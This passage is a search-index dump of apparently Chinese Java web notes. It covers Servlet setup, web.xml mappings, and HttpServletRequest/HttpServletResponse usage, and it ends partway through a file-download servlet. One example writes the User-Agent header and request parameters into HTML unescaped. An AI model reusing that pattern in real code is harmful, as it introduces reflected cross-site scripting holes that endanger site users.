\u4fee\u6539web.iml\uff0c\u540c\u6837\u9700\u8981\u5728\u6b64\u5bf9\u8fc7\u6ee4\u5668\u8fdb\u884c\u6ce8\u518c\u548c\u6620\u5c04\uff0c\u4f7f\u7528filter\u548cfilter-mapping\u4e24\u4e2a\u6807\u7b7e <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > <servlet> <servlet-name> index </servlet-name> <servlet-class> top.longlone.servlet.IndexServlet </servlet-class> </servlet> <servlet-mapping> <servlet-name> index </servlet-name> <url-pattern> /index </url-pattern> </servlet-mapping> <filter> <filter-name> characterEncoding </filter-name> <filter-class> top.longlone.filter.CharacterEncodingFilter </filter-class> </filter> <filter-mapping> <filter-name> characterEncoding </filter-name> <url-pattern> /index </url-pattern> </filter-mapping> </web-app>","title":"\u793a\u4f8b\u4ee3\u7801"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/","tags":["java"],"text":"HelloServlet # Servlet \u7b80\u4ecb # Servlet\uff08Server Applet\uff09\uff0c\u5168\u79f0Java Servlet\u3002\u662f\u7528Java\u7f16\u5199\u7684\u670d\u52a1\u5668\u7aef\u7a0b\u5e8f\u3002\u5176\u4e3b\u8981\u529f\u80fd\u5728\u4e8e\u751f\u6210\u52a8\u6001Web\u5185\u5bb9\u3002\u72ed\u4e49\u7684Servlet\u662f\u6307Java\u8bed\u8a00\u5b9e\u73b0\u7684\u4e00\u4e2a\u63a5\u53e3\uff0c\u5e7f\u4e49\u7684Servlet\u662f\u6307\u4efb\u4f55\u5b9e\u73b0\u4e86\u8fd9\u4e2aServlet\u63a5\u53e3\u7684\u7c7b\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4eba\u4eec\u5c06Servlet\u7406\u89e3\u4e3a\u540e\u8005\u3002 \u60f3\u8981\u5f00\u53d1\u4e00\u4e2aJava Web\u7a0b\u5e8f\uff0c\u53ea\u9700\u8981\u5b8c\u62102\u4e2a\u6b65\u9aa4: 1. \u7f16\u5199\u4e00\u4e2a\u7c7b\uff0c\u5b9e\u73b0Servlet\u63a5\u53e3 2. \u628a\u5f00\u53d1\u597d\u7684Java\u7c7b\u90e8\u7f72\u5230web\u670d\u52a1\u5668\u4e2d \u9879\u76ee\u6784\u5efa # \u6784\u5efa\u4e00\u4e2a\u666e\u901a\u7684maven\u9879\u76ee\uff0c\u5220\u6389src\u76ee\u5f55\uff0c\u8fd9\u4e2a\u7a7a\u5de5\u7a0b\u5c31\u662fmaven\u4e3b\u5de5\u7a0b \u5728\u4e3b\u5de5\u7a0b\u7684pom.xml\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u4f9d\u8d56 <dependencies> <dependency> <groupId> javax.servlet </groupId> <artifactId> javax.servlet-api </artifactId> <version> 4.0.1 </version> </dependency> <dependency> <groupId> javax.servlet.jsp </groupId> <artifactId> javax.servlet.jsp-api </artifactId> <version> 2.3.3 </version> </dependency> </dependencies> \u5728\u4e3b\u5de5\u7a0b\u4e0b\u9762\u65b0\u5efamaven\u6a21\u5757\uff0c\u521b\u5efa\u4e00\u4e2amaven web\u5b50\u5de5\u7a0b \u5728\u5b50\u5de5\u7a0b\u7684pom.xml\u4e2d\u6dfb\u52a0parent\u6807\u7b7e\uff0c\u4ee5\u7ee7\u627f\u4e3b\u5de5\u7a0b\u7684\u4f9d\u8d56 \u4fee\u6539\u5b50\u5de5\u7a0b\u4e0bsrc/main/webapp/WEB-INF/web.xml\u4e3a\u6700\u65b0 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > </web-app > \u5728src/main/\u65b0\u5efajava\u548cresources\u6587\u4ef6\u5939\u5e76\u6807\u8bb0(mark) \u5728\u53f3\u4e0a\u89d2\u4e2d\u6dfb\u52a0Tomcat\u914d\u7f6e\uff0c\u5177\u4f53\u6b65\u9aa4\u53c2\u8003\u4e4b\u524d\u7684 Tomcat \u7b80\u5355\u793a\u4f8b # \u7f16\u5199\u4e00\u4e2a\u7ee7\u627fHttpServlet\u7684\u7c7b \u91cd\u5199 do*** \u65b9\u6cd5\uff0c\u5982 doGet \uff0c doPost package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { PrintWriter writer = resp . getWriter (); writer . print ( \"Hello,Servlet\" ); } } \u7f16\u5199Servlet\u6620\u5c04(src/main/webapp/WEB-INF/web.xml) url-pattern\u53ef\u4ee5\u4f7f\u7528*\u901a\u914d\u7b26\uff0c\u4f46\u662f\u53ea\u80fd\u6709\u4e24\u79cd\u683c\u5f0f: *.\u6269\u5c55\u540d /\u5f00\u5934\uff0c*\u7ed3\u5c3e\u3002 url-pattern\u8fd8\u5b58\u5728\u4f18\u5148\u7ea7\uff0c\u8d8a\u7cbe\u51c6\u7684pattern\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u8d8a\u6a21\u7cca\u7684pattern\u4f18\u5148\u7ea7\u8d8a\u4f4e\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528/*\u8fd9\u4e2apattern\u6765\u81ea\u5b9a\u4e49404\u754c\u9762\u3002 \u4e00\u4e2aservlet\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u6620\u5c04\u8def\u5f84\u3002 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > <!-- \u6ce8\u518cservlet --> <servlet> <servlet-name> hello </servlet-name> <servlet-class> top.longlone.servlet.HelloServlet </servlet-class> </servlet> <!-- \u8bbe\u7f6eservlet\u6620\u5c04 --> <servlet-mapping> <servlet-name> hello </servlet-name> <!-- \u8fd9\u91ccurl-pattern\u53ef\u4ee5\u4f7f\u7528*\u901a\u914d\u7b26\uff0c\u4f46\u662f\u53ea\u80fd\u6709\u4e24\u79cd\u683c\u5f0f \u4e00\u662f*.\u6269\u5c55\u540d \u4e8c\u662f\u4ee5/\u5f00\u5934\uff0c*\u7ed3\u5c3e --> <url-pattern> /hello </url-pattern> </servlet-mapping> </web-app > 4. \u542f\u52a8tomcat\u670d\u52a1\u5668\uff0c\u8bbf\u95ee/hello Servlet\u4e0eTomcat\u5de5\u4f5c\u539f\u7406 # Web Client \u5411Servlet\u5bb9\u5668\uff08Tomcat\uff09\u53d1\u51faHttp\u8bf7\u6c42 Servlet\u5bb9\u5668\u63a5\u6536Web Client\u7684\u8bf7\u6c42 Servlet\u5bb9\u5668\u521b\u5efa\u4e00\u4e2aHttpRequest\u5bf9\u8c61\uff0c\u5c06Web Client\u8bf7\u6c42\u7684\u4fe1\u606f\u5c01\u88c5\u5230\u8fd9\u4e2a\u5bf9\u8c61\u4e2d\u3002 Servlet\u5bb9\u5668\u521b\u5efa\u4e00\u4e2aHttpResponse\u5bf9\u8c61 Servlet\u5bb9\u5668\u8c03\u7528HttpServlet\u5bf9\u8c61\u7684service\u65b9\u6cd5\uff0c\u628aHttpRequest\u5bf9\u8c61\u4e0eHttpResponse\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u7ed9 HttpServlet \u5bf9\u8c61\u3002 HttpServlet\u8c03\u7528HttpRequest\u5bf9\u8c61\u7684\u6709\u5173\u65b9\u6cd5\uff0c\u83b7\u53d6Http\u8bf7\u6c42\u4fe1\u606f\u3002 HttpServlet\u8c03\u7528HttpResponse\u5bf9\u8c61\u7684\u6709\u5173\u65b9\u6cd5\uff0c\u751f\u6210\u54cd\u5e94\u6570\u636e\u3002 Servlet\u5bb9\u5668\u628aHttpServlet\u7684\u54cd\u5e94\u7ed3\u679c\u4f20\u7ed9Web Client\u3002 \u603b\u7ed3 # \u8fd9\u8282\u4e3b\u8981\u4ecb\u7ecd\u4e86Servlet\uff0c\u4ee5\u53ca\u5982\u4f55\u5728IDEA\u4e2d\u4f7f\u7528Servlet\u7684\u7b80\u5355\u7528\u4f8b\uff0c\u6700\u540e\u4ecb\u7ecd\u4e86Servlet\u4e0eTomcat\u7684\u5de5\u4f5c\u539f\u7406\u3002","title":"HelloServlet"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/#helloservlet","text":"","title":"HelloServlet"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/#servlet-\u7b80\u4ecb","text":"Servlet\uff08Server Applet\uff09\uff0c\u5168\u79f0Java Servlet\u3002\u662f\u7528Java\u7f16\u5199\u7684\u670d\u52a1\u5668\u7aef\u7a0b\u5e8f\u3002\u5176\u4e3b\u8981\u529f\u80fd\u5728\u4e8e\u751f\u6210\u52a8\u6001Web\u5185\u5bb9\u3002\u72ed\u4e49\u7684Servlet\u662f\u6307Java\u8bed\u8a00\u5b9e\u73b0\u7684\u4e00\u4e2a\u63a5\u53e3\uff0c\u5e7f\u4e49\u7684Servlet\u662f\u6307\u4efb\u4f55\u5b9e\u73b0\u4e86\u8fd9\u4e2aServlet\u63a5\u53e3\u7684\u7c7b\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4eba\u4eec\u5c06Servlet\u7406\u89e3\u4e3a\u540e\u8005\u3002 \u60f3\u8981\u5f00\u53d1\u4e00\u4e2aJava Web\u7a0b\u5e8f\uff0c\u53ea\u9700\u8981\u5b8c\u62102\u4e2a\u6b65\u9aa4: 1. \u7f16\u5199\u4e00\u4e2a\u7c7b\uff0c\u5b9e\u73b0Servlet\u63a5\u53e3 2. \u628a\u5f00\u53d1\u597d\u7684Java\u7c7b\u90e8\u7f72\u5230web\u670d\u52a1\u5668\u4e2d","title":"Servlet \u7b80\u4ecb"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/#\u9879\u76ee\u6784\u5efa","text":"\u6784\u5efa\u4e00\u4e2a\u666e\u901a\u7684maven\u9879\u76ee\uff0c\u5220\u6389src\u76ee\u5f55\uff0c\u8fd9\u4e2a\u7a7a\u5de5\u7a0b\u5c31\u662fmaven\u4e3b\u5de5\u7a0b \u5728\u4e3b\u5de5\u7a0b\u7684pom.xml\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u4f9d\u8d56 <dependencies> <dependency> <groupId> javax.servlet </groupId> <artifactId> javax.servlet-api </artifactId> <version> 4.0.1 </version> </dependency> <dependency> <groupId> javax.servlet.jsp </groupId> <artifactId> javax.servlet.jsp-api </artifactId> <version> 2.3.3 </version> </dependency> </dependencies> \u5728\u4e3b\u5de5\u7a0b\u4e0b\u9762\u65b0\u5efamaven\u6a21\u5757\uff0c\u521b\u5efa\u4e00\u4e2amaven web\u5b50\u5de5\u7a0b \u5728\u5b50\u5de5\u7a0b\u7684pom.xml\u4e2d\u6dfb\u52a0parent\u6807\u7b7e\uff0c\u4ee5\u7ee7\u627f\u4e3b\u5de5\u7a0b\u7684\u4f9d\u8d56 \u4fee\u6539\u5b50\u5de5\u7a0b\u4e0bsrc/main/webapp/WEB-INF/web.xml\u4e3a\u6700\u65b0 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > </web-app > \u5728src/main/\u65b0\u5efajava\u548cresources\u6587\u4ef6\u5939\u5e76\u6807\u8bb0(mark) \u5728\u53f3\u4e0a\u89d2\u4e2d\u6dfb\u52a0Tomcat\u914d\u7f6e\uff0c\u5177\u4f53\u6b65\u9aa4\u53c2\u8003\u4e4b\u524d\u7684 Tomcat","title":"\u9879\u76ee\u6784\u5efa"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/#\u7b80\u5355\u793a\u4f8b","text":"\u7f16\u5199\u4e00\u4e2a\u7ee7\u627fHttpServlet\u7684\u7c7b \u91cd\u5199 do*** \u65b9\u6cd5\uff0c\u5982 doGet \uff0c doPost package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { PrintWriter writer = resp . getWriter (); writer . print ( \"Hello,Servlet\" ); } } \u7f16\u5199Servlet\u6620\u5c04(src/main/webapp/WEB-INF/web.xml) url-pattern\u53ef\u4ee5\u4f7f\u7528*\u901a\u914d\u7b26\uff0c\u4f46\u662f\u53ea\u80fd\u6709\u4e24\u79cd\u683c\u5f0f: *.\u6269\u5c55\u540d /\u5f00\u5934\uff0c*\u7ed3\u5c3e\u3002 url-pattern\u8fd8\u5b58\u5728\u4f18\u5148\u7ea7\uff0c\u8d8a\u7cbe\u51c6\u7684pattern\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u8d8a\u6a21\u7cca\u7684pattern\u4f18\u5148\u7ea7\u8d8a\u4f4e\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528/*\u8fd9\u4e2apattern\u6765\u81ea\u5b9a\u4e49404\u754c\u9762\u3002 \u4e00\u4e2aservlet\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u6620\u5c04\u8def\u5f84\u3002 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > <!-- \u6ce8\u518cservlet --> <servlet> <servlet-name> hello </servlet-name> <servlet-class> top.longlone.servlet.HelloServlet </servlet-class> </servlet> <!-- \u8bbe\u7f6eservlet\u6620\u5c04 --> <servlet-mapping> <servlet-name> hello </servlet-name> <!-- \u8fd9\u91ccurl-pattern\u53ef\u4ee5\u4f7f\u7528*\u901a\u914d\u7b26\uff0c\u4f46\u662f\u53ea\u80fd\u6709\u4e24\u79cd\u683c\u5f0f \u4e00\u662f*.\u6269\u5c55\u540d \u4e8c\u662f\u4ee5/\u5f00\u5934\uff0c*\u7ed3\u5c3e --> <url-pattern> /hello </url-pattern> </servlet-mapping> </web-app > 4. \u542f\u52a8tomcat\u670d\u52a1\u5668\uff0c\u8bbf\u95ee/hello","title":"\u7b80\u5355\u793a\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/#servlet\u4e0etomcat\u5de5\u4f5c\u539f\u7406","text":"Web Client \u5411Servlet\u5bb9\u5668\uff08Tomcat\uff09\u53d1\u51faHttp\u8bf7\u6c42 Servlet\u5bb9\u5668\u63a5\u6536Web Client\u7684\u8bf7\u6c42 Servlet\u5bb9\u5668\u521b\u5efa\u4e00\u4e2aHttpRequest\u5bf9\u8c61\uff0c\u5c06Web Client\u8bf7\u6c42\u7684\u4fe1\u606f\u5c01\u88c5\u5230\u8fd9\u4e2a\u5bf9\u8c61\u4e2d\u3002 Servlet\u5bb9\u5668\u521b\u5efa\u4e00\u4e2aHttpResponse\u5bf9\u8c61 Servlet\u5bb9\u5668\u8c03\u7528HttpServlet\u5bf9\u8c61\u7684service\u65b9\u6cd5\uff0c\u628aHttpRequest\u5bf9\u8c61\u4e0eHttpResponse\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u7ed9 HttpServlet \u5bf9\u8c61\u3002 HttpServlet\u8c03\u7528HttpRequest\u5bf9\u8c61\u7684\u6709\u5173\u65b9\u6cd5\uff0c\u83b7\u53d6Http\u8bf7\u6c42\u4fe1\u606f\u3002 HttpServlet\u8c03\u7528HttpResponse\u5bf9\u8c61\u7684\u6709\u5173\u65b9\u6cd5\uff0c\u751f\u6210\u54cd\u5e94\u6570\u636e\u3002 Servlet\u5bb9\u5668\u628aHttpServlet\u7684\u54cd\u5e94\u7ed3\u679c\u4f20\u7ed9Web Client\u3002","title":"Servlet\u4e0eTomcat\u5de5\u4f5c\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/#\u603b\u7ed3","text":"\u8fd9\u8282\u4e3b\u8981\u4ecb\u7ecd\u4e86Servlet\uff0c\u4ee5\u53ca\u5982\u4f55\u5728IDEA\u4e2d\u4f7f\u7528Servlet\u7684\u7b80\u5355\u7528\u4f8b\uff0c\u6700\u540e\u4ecb\u7ecd\u4e86Servlet\u4e0eTomcat\u7684\u5de5\u4f5c\u539f\u7406\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletRequest/","tags":["java"],"text":"HttpServletRequest # Http servletRequest\u4ee3\u8868\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\uff0c\u7528\u6237\u901a\u8fc7HTTP\u534f\u8bae\u8bbf\u95ee\u670d\u52a1\u5668\uff0cHTTP\u8bf7\u6c42\u4e2d\u7684\u6240\u6709\u4fe1\u606f\u4f1a\u88ab\u5c01\u88c5\u5230 HttpServletRequest ,\u901a\u8fc7 HttpServletRequest \u7684\u65b9\u6cd5\uff0c\u83b7\u5f97\u5ba2\u6237\u7aef\u7684\u6240\u6709\u4fe1\u606f\u3002 \u5e38\u89c1\u5e94\u7528 # \u83b7\u53d6\u8bf7\u6c42\u53c2\u6570\u548c\u8bf7\u6c42\u5934 # package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; import java.util.Arrays ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { // \u8bbe\u7f6e\u8bf7\u6c42\u7f16\u7801 req . setCharacterEncoding ( \"utf-8\" ); // \u8bbe\u7f6e\u54cd\u5e94\u7f16\u7801 resp . setHeader ( \"Content-Type\" , \"text/html; charset=utf-8\" ); String ua = req . getHeader ( \"User-Agent\" ); // \u83b7\u53d6\u53c2\u6570value String value = req . getParameter ( \"value\" ); // \u83b7\u53d6\u53c2\u6570values\uff0c\u5141\u8bb8\u591a\u4e2a\u53c2\u6570\uff0c\u5982values=1&values=2 String [] values = req . getParameterValues ( \"values\" ); // \u8f93\u51fa PrintWriter out = resp . getWriter (); out . write ( \"UA:\" + ua + \"<br>\u53c2\u6570: \" + value + \" \" + Arrays . toString ( values )); } } \u83b7\u53d6\u8bf7\u6c42\u4f53 # package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.ServletInputStream ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.BufferedReader ; import java.io.IOException ; import java.io.PrintWriter ; import java.util.Arrays ; public class HelloServlet extends HttpServlet { @Override protected void doPost ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { // \u5b57\u7b26\u4e32\u5f62\u5f0f\u83b7\u53d6body // BufferedReader reqReader = req.getReader(); // String str, body = \"\"; // // while((str=reqReader.readLine()) != null) { // body += str; // } // \u4e8c\u8fdb\u5236\u5f62\u5f0f\u83b7\u53d6body int len = req . getContentLength (); ServletInputStream reqInputStream = req . getInputStream (); byte [] body = new byte [ len ] ; reqInputStream . read ( body , 0 , len ); resp . getWriter (). write ( new String ( body )); } } \u8f6c\u53d1 # package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.ServletInputStream ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.BufferedReader ; import java.io.IOException ; import java.io.PrintWriter ; import java.util.Arrays ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { // \u8fd9\u91cc\u7684/get\u4e2d/\u4ee3\u8868\u5f53\u524d\u7a0b\u5e8f\u7684\u6839\u76ee\u5f55\uff0c\u4e0d\u52a0/\u7684\u8bdd\u5c31\u662f\u76f8\u5bf9\u7684\u8def\u5f84\uff0c\u8fd9\u91cc\u52a0\u4e0d\u52a0\u90fd\u53ef\u4ee5 req . getRequestDispatcher ( \"/get\" ). forward ( req , resp ); } } \u603b\u7ed3 # \u672c\u8282\u4e3b\u8981\u8bb2\u4e86HttpServletRequest\u7c7b\u7684\u4f7f\u7528\u3002","title":"HttpServletRequest"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletRequest/#httpservletrequest","text":"Http servletRequest\u4ee3\u8868\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\uff0c\u7528\u6237\u901a\u8fc7HTTP\u534f\u8bae\u8bbf\u95ee\u670d\u52a1\u5668\uff0cHTTP\u8bf7\u6c42\u4e2d\u7684\u6240\u6709\u4fe1\u606f\u4f1a\u88ab\u5c01\u88c5\u5230 HttpServletRequest ,\u901a\u8fc7 HttpServletRequest \u7684\u65b9\u6cd5\uff0c\u83b7\u5f97\u5ba2\u6237\u7aef\u7684\u6240\u6709\u4fe1\u606f\u3002","title":"HttpServletRequest"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletRequest/#\u5e38\u89c1\u5e94\u7528","text":"","title":"\u5e38\u89c1\u5e94\u7528"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletRequest/#\u83b7\u53d6\u8bf7\u6c42\u53c2\u6570\u548c\u8bf7\u6c42\u5934","text":"package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; import java.util.Arrays ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { // \u8bbe\u7f6e\u8bf7\u6c42\u7f16\u7801 req . setCharacterEncoding ( \"utf-8\" ); // \u8bbe\u7f6e\u54cd\u5e94\u7f16\u7801 resp . setHeader ( \"Content-Type\" , \"text/html; charset=utf-8\" ); String ua = req . getHeader ( \"User-Agent\" ); // \u83b7\u53d6\u53c2\u6570value String value = req . getParameter ( \"value\" ); // \u83b7\u53d6\u53c2\u6570values\uff0c\u5141\u8bb8\u591a\u4e2a\u53c2\u6570\uff0c\u5982values=1&values=2 String [] values = req . getParameterValues ( \"values\" ); // \u8f93\u51fa PrintWriter out = resp . getWriter (); out . write ( \"UA:\" + ua + \"<br>\u53c2\u6570: \" + value + \" \" + Arrays . toString ( values )); } }","title":"\u83b7\u53d6\u8bf7\u6c42\u53c2\u6570\u548c\u8bf7\u6c42\u5934"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletRequest/#\u83b7\u53d6\u8bf7\u6c42\u4f53","text":"package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.ServletInputStream ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.BufferedReader ; import java.io.IOException ; import java.io.PrintWriter ; import java.util.Arrays ; public class HelloServlet extends HttpServlet { @Override protected void doPost ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { // \u5b57\u7b26\u4e32\u5f62\u5f0f\u83b7\u53d6body // BufferedReader reqReader = req.getReader(); // String str, body = \"\"; // // while((str=reqReader.readLine()) != null) { // body += str; // } // \u4e8c\u8fdb\u5236\u5f62\u5f0f\u83b7\u53d6body int len = req . getContentLength (); ServletInputStream reqInputStream = req . getInputStream (); byte [] body = new byte [ len ] ; reqInputStream . read ( body , 0 , len ); resp . getWriter (). write ( new String ( body )); } }","title":"\u83b7\u53d6\u8bf7\u6c42\u4f53"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletRequest/#\u8f6c\u53d1","text":"package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.ServletInputStream ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.BufferedReader ; import java.io.IOException ; import java.io.PrintWriter ; import java.util.Arrays ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { // \u8fd9\u91cc\u7684/get\u4e2d/\u4ee3\u8868\u5f53\u524d\u7a0b\u5e8f\u7684\u6839\u76ee\u5f55\uff0c\u4e0d\u52a0/\u7684\u8bdd\u5c31\u662f\u76f8\u5bf9\u7684\u8def\u5f84\uff0c\u8fd9\u91cc\u52a0\u4e0d\u52a0\u90fd\u53ef\u4ee5 req . getRequestDispatcher ( \"/get\" ). forward ( req , resp ); } }","title":"\u8f6c\u53d1"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletRequest/#\u603b\u7ed3","text":"\u672c\u8282\u4e3b\u8981\u8bb2\u4e86HttpServletRequest\u7c7b\u7684\u4f7f\u7528\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/","tags":["java"],"text":"HttpServletResponse # web\u670d\u52a1\u5668\u63a5\u6536\u5230\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u540e\uff0c\u4f1a\u5c01\u88c5\u4e00\u4e2aHttpServletRequest\u548cHttpServletResponse HttpServletResponse\u4e2d\u7684\u65b9\u6cd5 # \u83b7\u53d6\u8f93\u51fa\u54cd\u5e94\u5bf9\u8c61 # public ServletOutputStream getOutputStream () throws IOException ; public PrintWriter getWriter () throws IOException ; \u8bbe\u7f6e\u54cd\u5e94\u4fe1\u606f # public void setCharacterEncoding ( String charset ); public void setContentLength ( int len ); public void setContentLengthLong ( long len ); public void setContentType ( String type ); public void addCookie ( Cookie cookie ); public void setDateHeader ( String name , long date ); public void addDateHeader ( String name , long date ); public void setHeader ( String name , String value ); public void addHeader ( String name , String value ); public void setIntHeader ( String name , int value ); public void addIntHeader ( String name , int value ); public void setStatus ( int sc ); public void sendError ( int sc , String msg ) throws IOException ; public void sendRedirect ( String location ) throws IOException ; \u83b7\u53d6\u54cd\u5e94\u4fe1\u606f # public int getStatus (); public String getHeader ( String name ); public Collection < String > getHeaders ( String name ); public Collection < String > getHeaderNames (); public String getCharacterEncoding (); public String getContentType (); \u5176\u4ed6 # public String encodeURL ( String url ); public String encodeRedirectURL ( String url ); \u5e38\u89c1\u5e94\u7528 # \u8f93\u51fa\u54cd\u5e94\u672c\u4f53 # \u4f7f\u7528 getOutputStream \u6216 getWriter \u83b7\u53d6\u8f93\u51fa\u54cd\u5e94\u5bf9\u8c61\u4e4b\u540e\u5c31\u53ef\u4ee5\u8f93\u51fa\u54cd\u5e94\u672c\u4f53\u4e86\u3002 \u4e0b\u8f7d\u6587\u4ef6 # \u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8def\u5f84\u548c\u6587\u4ef6\u540d \u8bbe\u7f6e\u54cd\u5e94\u5934 \u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8f93\u5165\u6d41\u548cOutputStream\u5bf9\u8c61 \u521b\u5efabuffer\u7f13\u51b2\u533a \u5c06FileOutputStream\u6d41\u5199\u5165buffer\u7f13\u51b2\u533a\uff0c\u518d\u5c06\u5176\u8f93\u51fa\u5230\u5ba2\u6237\u7aef package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.ServletOutputStream ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.File ; import java.io.FileInputStream ; import java.io.IOException ; import java.io.PrintWriter ; import java.net.URLEncoder ; public class DownloadServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { // \u83b7\u53d6\u8d44\u6e90\u6587\u4ef6\u8def\u5f84 String filepath = this . getServletContext (). getRealPath ( \"/WEB-INF/classes/db.properties\" ); // \u83b7\u53d6\u6587\u4ef6\u540d File file = new File ( filepath ); String fileName = file . getName (); // \u8bbe\u7f6e\u54cd\u5e94\u5934\uff0c\u8fd9\u91cc\u8981\u5c06filename\u7f16\u7801\u4e00\u4e0b\u4ee5\u652f\u6301\u4e2d\u6587\u540d resp . setHeader ( \"Content-Disposition\" , \"attachment;filename=\" + URLEncoder . encode ( fileName , \"UTF-8\" )); resp . setHeader ( \"Content-Length\" , String . valueOf ( file . length ())); // 